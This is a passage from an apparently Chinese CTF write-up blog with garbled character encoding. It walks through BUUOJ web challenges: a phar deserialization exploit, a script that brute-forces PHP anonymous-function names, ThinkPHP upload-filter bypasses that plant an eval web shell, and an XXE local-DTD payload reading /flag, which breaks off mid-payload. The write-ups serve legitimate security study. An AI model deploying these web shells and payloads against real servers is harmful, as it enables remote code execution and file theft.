class="token operator">-></span><span class="token property">token</span> <span class="token operator">!=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"die('check token falied!');"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$uploader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$uploader</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br>"</span><span class="token operator">.</span><span class="token variable">$uploader</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„æœ‰ä¸€ä¸ªfile_get_contentså­˜åœ¨pharååºåˆ—åŒ–ï¼Œä»»æ„ä¸Šä¼ æ–‡ä»¶å¯ä»¥æ‹¿åˆ°<code>$_SESSION[&#39;user&#39;]</code>ï¼Œç„¶åæ„é€ exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Uploader</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$Filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$upload</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"highlight_file('/var/www/html/flag.php');"</span><span class="token punctuation">;</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">token</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'GXY380513e563f39abb95bd589a6d2648ec'</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¼ åå°†nameå‚æ•°æ”¹ä¸º<code>phar:///var/www/html/uploads/da3fd6a2cf9c6007bda4c8a58e394ba2/GXY380513e563f39abb95bd589a6d2648ec.txt</code>åˆ·æ–°å³å¯æ‹¿flag</p><h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><p>æºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$MY</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"die(`cat flag.php`);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºæ— åå‡½æ•°</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">openssl_random_pseudo_bytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç”Ÿæˆéšæœºæ•°</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"function SUCTF_<span class="token interpolation"><span class="token variable">$hash</span></span>()&#123;"</span>    <span class="token operator">.</span><span class="token string double-quoted-string">"global \$MY;"</span>    <span class="token operator">.</span><span class="token string double-quoted-string">"\$MY();"</span>    <span class="token operator">.</span><span class="token string double-quoted-string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç»™äº†æ— åå‡½æ•°ä¸€ä¸ªåå­—ï¼Œä½†æ˜¯æ˜¯éšæœºçš„</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"func_name"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>åŒ¿åå‡½æ•°å…¶å®æ˜¯æœ‰çœŸæ­£çš„åå­—ï¼Œä¸º%00lambda_%d(%dæ ¼å¼åŒ–ä¸ºå½“å‰è¿›ç¨‹çš„ç¬¬nä¸ªåŒ¿åå‡½æ•°,nçš„èŒƒå›´0-999)</p></blockquote><p>é€šè¿‡ä¸Šé¢è¿™ä¸ªæ–¹æ³•ï¼Œç”¨ä¸ªè„šæœ¬å°±èƒ½è·‘å‡ºæ¥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'http://bb841c48-16f0-4700-a630-f8a44d9cfced.node4.buuoj.cn:81/?func_name=%00lambda_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span> <span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>         <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>         <span class="token variable">$uploadFile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$uploadFile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>                  <span class="token variable">$upload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Think<span class="token punctuation">\</span>Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å®ä¾‹åŒ–ä¸Šä¼ ç±» </span>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">maxSize</span>  <span class="token operator">=</span> <span class="token number">4096</span> <span class="token punctuation">;</span><span class="token comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å¤§å° </span>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">allowExts</span>  <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç±»å‹ </span>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">rootPath</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./Public/Uploads/'</span><span class="token punctuation">;</span><span class="token comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç›®å½• </span>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">savePath</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å­ç›®å½• </span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$upload</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// ä¸Šä¼ é”™è¯¯æç¤ºé”™è¯¯ä¿¡æ¯ </span>          <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">return</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token comment">// ä¸Šä¼ æˆåŠŸ è·å–ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯ </span>          <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token constant">__ROOT__</span><span class="token operator">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">rootPath</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'savepath'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'savename'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>           <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"url"</span><span class="token operator">=></span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"success"</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1ã€çœ‹æºç å¯ä»¥çœ‹å‡ºæ¥æ˜¯thinkphpçš„æ–‡ä»¶ä¸Šä¼ ï¼Œä»£ç ä¸­è¿‡æ»¤äº†phpæ–‡ä»¶åç¼€ï¼Œè€Œåœ¨thinkphpä¸­æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™ä¼šå¯¹æ–‡ä»¶åè¿›è¡Œè¿™æ ·çš„å¤„ç†</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span>  <span class="token operator">=</span> <span class="token function">strip_tags</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œå°†&lt;>æ ‡ç­¾åˆ æ‰</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span>    <span class="token operator">=</span>   <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token comment">/* é€šè¿‡æ‰©å±•è·å–æ–‡ä»¶ç±»å‹ï¼Œå¯è§£å†³FLASHä¸Šä¼ $FILESæ•°ç»„è¿”å›æ–‡ä»¶ç±»å‹é”™è¯¯çš„é—®é¢˜ */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span>   <span class="token operator">=</span>   <span class="token function">finfo_file</span> <span class="token punctuation">(</span> <span class="token variable">$finfo</span> <span class="token punctuation">,</span>  <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥å¯ä»¥æ„é€ å¦‚ä¸‹çš„payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  requestsurl <span class="token operator">=</span> <span class="token string">"http://bb841c48-16f0-4700-a630-f8a44d9cfced.node4.buuoj.cn:81/index.php/home/index/upload"</span>files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'1.&lt;>php'</span><span class="token punctuation">,</span><span class="token string">"&lt;?php eval($_GET['cmd'])?>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2ã€think PHPé‡Œçš„upload()å‡½æ•°åœ¨ä¸ä¼ å‚çš„æƒ…å†µä¸‹æ˜¯æ‰¹é‡ä¸Šä¼ çš„ï¼Œæ‰€ä»¥å¦‚æœä¸Šä¼ å¤šä¸ªæ–‡ä»¶</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uploadFile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$uploadFile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„nameå³ä¸ºæ•°ç»„ï¼Œå¯ç›´æ¥ç»•è¿‡</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  requestsurl <span class="token operator">=</span> <span class="token string">"http://f2d454a6-807f-4da4-9815-e366f39612d8.node4.buuoj.cn:81/index.php/home/index/upload"</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>files2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file[]'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">,</span><span class="token string">"&lt;?php eval($_GET['cmd'])?>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files <span class="token operator">=</span> files<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files <span class="token operator">=</span> files2<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files <span class="token operator">=</span> files<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»§ç»­å¾€ä¸‹èµ°ï¼Œå‘ç°è™½ç„¶phpæ–‡ä»¶ç¡®å®ä¸Šä¼ æˆåŠŸäº†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è¿”å›æ–‡ä»¶åï¼Œçœ‹å‰åä¸¤ä¸ªæ–‡ä»¶é‡å‘½ååçš„å†…å®¹å‘ç°æ–‡ä»¶åçš„ç”Ÿæˆæ˜¯æœ‰è§„å¾‹çš„ï¼Œäº†è§£åçŸ¥é“æ–‡ä»¶åæ˜¯é€šè¿‡uniqidå¾—åˆ°çš„ï¼Œè¿™æ˜¯æ ¹æ®å½“å‰æ—¶é—´æ¥å¾—åˆ°çš„éšæœºæ•°ï¼Œé‚£ä¹ˆæ ¹æ®å‰åä¸¤ä¸ªæ–‡ä»¶åä¸åŒçš„ä½ç½®è¿›è¡Œçˆ†ç ´å³å¯</p><h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p>é€‰æ‹©åŸå¸‚å¹¶ä¸”è¿›è¡Œsubmitæ—¶ä¼šå‘apiå‘é€ä¸€ä¸ªjsonæ ¼å¼çš„postè¯·æ±‚ï¼Œè¿™é‡Œå…¶å®å°±æœ‰å¯èƒ½å­˜åœ¨XXEæ³¨å…¥</p><p>åœ¨burpä¸­å°è¯•é€šè¿‡xmlæ–¹å¼ä¼ å…¥åŸå§‹æ•°æ®ï¼Œæç¤ºæœªå‘ç°&lt;æ ‡ç­¾</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061819430.png"></p><p>æŒ‰ç…§xmlæ ¼å¼æ„é€ å†…å®¹æç¤ºæ²¡æœ‰DTD</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061821510.png"></p><p>é‚£æˆ‘ä»¬åœ¨æ”¾ä¸€ä¸ªDTDè¿›å»ï¼Œæç¤ºæœ‰æœªå£°æ˜çš„å…ƒç´ æ¶ˆæ¯</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061823346.png"></p><p>æ­¤å¤„ç±»ä¼¼äºåœ¨ä½¿ç”¨å˜é‡å‰è¦å…ˆå¯¹å˜é‡è¿›è¡Œå£°æ˜ï¼Œæˆ‘ä»¬åªéœ€è¦å£°æ˜ä¸€ä¸‹messageå…ƒç´ å³å¯ï¼Œæ­¤æ—¶å›æ˜¾æ­£å¸¸</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061829146.png"></p><p>é‚£ä¹ˆä¸‹ä¸€æ­¥æˆ‘ä»¬å°±è¦æƒ³å¦‚ä½•æ„é€ æ‰èƒ½è®©flagå›æ˜¾ï¼Œæˆ‘ä»¬å…ˆçœ‹æ˜¯å¦èƒ½è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæç¤ºæ–‡ä»¶è™½ç„¶å­˜åœ¨ä½†å¹¶ä¸æ˜¯ä¸€ä¸ªæ ¼å¼è‰¯å¥½çš„xmlæ–‡ä»¶ï¼Œæ‰€ä»¥åŠ è½½ä¸­æ–­äº†ï¼Œå°†/flagä¼ å…¥å‘ç°å›æ˜¾ç›¸åŒï¼Œè¯´æ˜flagæ–‡ä»¶å­˜åœ¨ï¼Œä½†æ˜¯æˆ‘ä»¬æ€ä¹ˆè¯»å–å‘¢ï¼Ÿ</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061833299.png"></p><p>ä¸€ä¸ªåˆ©ç”¨æœ¬åœ°DTDæ¥XXEè¾“å‡ºä»»ä½•æ–‡ä»¶å†…å®¹çš„å°<a href="https://mohemiv.com/tags/xxe/">trick</a></p><blockquote><p>æœ¬è´¨ä¸Šæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æœ¬åœ°DTDæ–‡ä»¶çš„å®ä½“ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦åœ¨å®Œå…¨åŠ è½½å®ƒä¹‹å‰å¯¹å®ƒè¿›è¡Œå®šä¹‰</p><p>è€Œä¸”Linuxè®¾å¤‡å¯èƒ½åœ¨/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtdä¸­æœ‰ä¸€ä¸ªDTDæ–‡ä»¶ã€‚å¹¶ä¸”è¿™ä¸ªæ–‡ä»¶åˆä¸€ä¸ªåä¸ºISOamsaçš„å®ä½“ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒæ¥å†™DTDä»£ç ã€‚ç°åœ¨æˆ‘ä»¬æ¥åˆ¶ä½œDTDä»£ç ã€‚</p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆå°è¯•æ”¾å…¥ä¸€ä¸ªé”™è¯¯çš„æ–‡ä»¶ä½ç½®ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶åè¢«å›æ˜¾å‡ºæ¥äº†</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061843021.png"></p><p>æ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯æ„é€ DTDä»£ç ä½¿å¾—è¯»å–çš„æ–‡ä»¶åæ˜¯æˆ‘ä»¬å®é™…è¦è¯»å–çš„æ–‡ä»¶çš„å†…å®¹ï¼Œä½¿å¾—æŠ¥é”™å¯¼è‡´å®é™…è¯»å–çš„æ–‡ä»¶å†…å®¹è¢«æ”¾å…¥è™šå‡çš„æ–‡ä»¶åä¸­è¢«çˆ†å‡º</p><p>å¤§ä½¬æ„é€ å‡ºçš„xmlå¦‚ä¸‹</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message[    &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#39;    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM 